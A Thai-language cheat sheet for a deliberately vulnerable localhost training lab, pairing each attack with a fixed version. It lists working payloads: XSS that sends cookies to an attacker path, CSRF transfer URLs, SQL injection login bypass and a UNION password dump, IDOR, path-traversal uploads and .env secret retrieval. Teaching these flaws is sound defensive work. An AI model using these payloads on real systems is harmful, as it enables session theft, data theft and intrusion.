# 📋 แผ่นสรุปคำสั่ง (Cheat Sheet) — คัดลอกไปใช้ได้เลย

สำหรับใช้ **สอน / อบรม** ให้เห็นภาพเร็ว ทุกบล็อกโค้ดในหน้านี้มีปุ่มคัดลอก (บน GitHub)

> ⚠️ ทุกแล็บตั้งใจให้มีช่องโหว่ **รันบนเครื่องตัวเองเท่านั้น** ห้าม deploy ห้ามใช้กับระบบที่ไม่ได้รับอนุญาต (ผิด พ.ร.บ. คอมพิวเตอร์ฯ)

---

## 🚀 เปิดทุกแล็บพร้อมกัน

```bash
cd "E:\work\youtube\Anti-hacking matters"
node run-all.js
```

เปิดทีละแล็บก็ได้ (เข้าโฟลเดอร์แล้ว `node server.js`) กด `Ctrl+C` เพื่อปิด · ทุกแล็บมีหน้า `/reset` ไว้ล้างข้อมูลเริ่มใหม่

| แล็บ | URL | บัญชีทดสอบ |
|---|---|---|
| XSS | http://localhost:3000 | admin / admin123 · somchai / somchai123 |
| CSRF | http://localhost:4000 | alice / alice123 · hacker / hacker123 |
| Broken Access Control | http://localhost:4100 | alice / alice123 · bob / bob123 · admin / admin123 |
| SQL Injection | http://localhost:4200 | (ดู payload ด้านล่าง) |
| Authentication | http://localhost:4300 | user / 123456 · admin / Tr0ub4dor&3xK |
| CORS | http://localhost:4400 | somsri / somsri123 |
| File Upload | http://localhost:4500 | — |
| Secrets | http://localhost:4600 | — |
| Dependencies | http://localhost:4700 | — |
| Error Handling | http://localhost:4800 | — |

---

## 1) XSS — http://localhost:3000

**เปิด:** `node server.js` ในโฟลเดอร์ `XSS/`

Reflected — วางใน URL แล้วกดเปิด (สคริปต์เด้งเพราะเว็บเอา input มาแสดงตรงๆ):
```
http://localhost:3000/search?q=<img src=x onerror="alert(document.cookie)">
```

Stored — วางในช่องข้อความของ `/guestbook` (ทุกคนที่เปิดหน้านี้โดนหมด ส่งคุกกี้ไปหน้าแฮกเกอร์):
```html
<script>new Image().src='/attacker/collect?c='+encodeURIComponent(document.cookie)</script>
```

**เดโมขโมย session:** ล็อกอินเป็น `admin` → โพสต์ payload ข้างบนที่ `/guestbook` → ดูคุกกี้ที่ขโมยได้ที่ `/attacker` → ทำตามขั้นตอน "สวมรอย" → เทียบหน้าแก้แล้วที่ `/safe/guestbook`

---

## 2) CSRF — http://localhost:4000

**เปิด:** `node server.js` ในโฟลเดอร์ `CSRF/`

1. ล็อกอินเป็น `alice` (ยอดเงิน 10,000) **อย่าออกจากระบบ**
2. เปิดหน้าเว็บแฮกเกอร์: http://localhost:4000/evil → เงินถูกโอนไป `hacker` 5,000 อัตโนมัติ
3. เทียบหน้าปลอดภัย: http://localhost:4000/safe/evil → โดนบล็อกด้วย CSRF token

CSRF ผ่าน GET (แค่แปะรูปก็โอนเงินได้ ถ้ายอมรับ GET):
```
http://localhost:4000/transfer?to=hacker&amount=1000
```

---

## 3) Broken Access Control — http://localhost:4100

**เปิด:** `node server.js` ในโฟลเดอร์ `Broken-Access-Control/`

IDOR — ล็อกอินเป็น `alice` แล้วเปลี่ยนเลขใน URL เป็นออเดอร์ของ `bob`:
```
http://localhost:4100/orders/201
```
เทียบหน้าปลอดภัย (เช็กความเป็นเจ้าของ → 403):
```
http://localhost:4100/safe/orders/201
```

Privilege escalation — ผู้ใช้ธรรมดาเข้าหน้าแอดมิน: `/admin` (เข้าได้) เทียบ `/safe/admin` (โดน 403)

---

## 4) SQL Injection — http://localhost:4200

**เปิด:** `node server.js` ในโฟลเดอร์ `SQL-Injection/`

Login bypass — กรอกในช่อง **username** (รหัสผ่านอะไรก็ได้):
```
admin' --
```

ดึงรหัสผ่านทุกคนผ่านช่องค้นหา `/search` (UNION):
```
' UNION SELECT id, username, password, role FROM users --
```

ดึงทุกแถว:
```
' OR '1'='1' --
```

เทียบหน้าปลอดภัย `/safe/login` และ `/safe/search` (ใช้ parameterized query → payload ใช้ไม่ได้)

---

## 5) Authentication — http://localhost:4300

**เปิด:** `node server.js` ในโฟลเดอร์ `Authentication/`

- `/leak` เก็บรหัสผ่านแบบ plain text (DB รั่ว = เห็นรหัสทันที) เทียบ `/safe/leak` (เก็บเป็น hash)
- `/login` เดารหัสได้ไม่จำกัด (บัญชี `user` รหัสอ่อน `123456`) เทียบ `/safe/login` (ล็อกหลังผิด 5 ครั้ง)
- `/token` token เดาได้ + `/forge?user=admin` สวมรอย เทียบ `/safe/token` (token สุ่ม + หมดอายุ)

---

## 6) CORS — http://localhost:4400

**เปิด:** `node server.js` ในโฟลเดอร์ `CORS/`

1. ล็อกอิน `somsri` ที่ http://localhost:4400
2. เปิดหน้าแฮกเกอร์ที่ origin ต่างกัน: http://127.0.0.1:4400/evil → อ่านข้อมูลลับได้ (โหมด vuln)
3. ดู Console (F12): endpoint ปลอดภัยจะโดนบล็อก (CORS error)

พิสูจน์ว่า CORS ≠ การตรวจสิทธิ์ (curl เห็นข้อมูลเสมอ เพราะ CORS กันแค่เบราว์เซอร์):
```bash
curl http://localhost:4400/api/me
```

---

## 7) File Upload — http://localhost:4500

**เปิด:** `node server.js` ในโฟลเดอร์ `File-Upload/`

อัปโหลดไฟล์ HTML อันตราย (มีไฟล์ตัวอย่างให้ที่ `File-Upload/samples/evil.html`):
```bash
curl -F "file=@samples/evil.html" http://localhost:4500/upload
```

จากนั้นเปิด http://localhost:4500/uploads/evil.html → สคริปต์รันในโดเมนเว็บ (Stored XSS)

Path traversal — ตั้งชื่อไฟล์ให้หลุดออกนอกโฟลเดอร์:
```bash
curl -F "file=@samples/evil.html;filename=../pwned.html" http://localhost:4500/upload
```

เทียบหน้าปลอดภัย http://localhost:4500/safe (เช็กชนิดไฟล์จริง, ตั้งชื่อใหม่, บังคับดาวน์โหลด)

---

## 8) Secrets — http://localhost:4600

**เปิด:** `node server.js` ในโฟลเดอร์ `Secrets/`

ดึงไฟล์ `.env` ที่เผลอวางในเว็บรูท (ค่าปลอมทั้งหมด):
```bash
curl http://localhost:4600/raw/.env
```

เทียบหน้าปลอดภัย (บล็อก dotfile → 403):
```bash
curl -i http://localhost:4600/safe/raw/.env
```

- `/frontend` ดู API key ที่ฝังในโค้ด JS (เปิด DevTools → Sources) เทียบ `/safe/frontend` (เรียกผ่าน backend)

---

## 9) Dependencies — http://localhost:4700

**เปิด:** `node server.js` ในโฟลเดอร์ `Dependencies/`

- `/` แดชบอร์ดแสดง dependency เก่าที่มีช่องโหว่ · `/audit` ตัวอย่างผลลัพธ์ `npm audit`

คำสั่งที่เอาไปใช้กับโปรเจกต์จริงของคุณ:
```bash
npm audit
```
```bash
npm audit fix
```
```bash
npm outdated
```

---

## 10) Error Handling — http://localhost:4800

**เปิด:** `node server.js` ในโฟลเดอร์ `Error-Handling/`

ยิง input ที่ทำให้พัง แล้วดูว่าโหมด vuln คาย stack trace / รายละเอียด DB ออกมา:
```
http://localhost:4800/user?id=abc
```
```
http://localhost:4800/divide?a=10&b=0
```

เทียบหน้าปลอดภัย (ขึ้นแค่ "เกิดข้อผิดพลาด" + error id, รายละเอียดเก็บใน log ฝั่งเซิร์ฟเวอร์):
```
http://localhost:4800/safe/user?id=abc
```
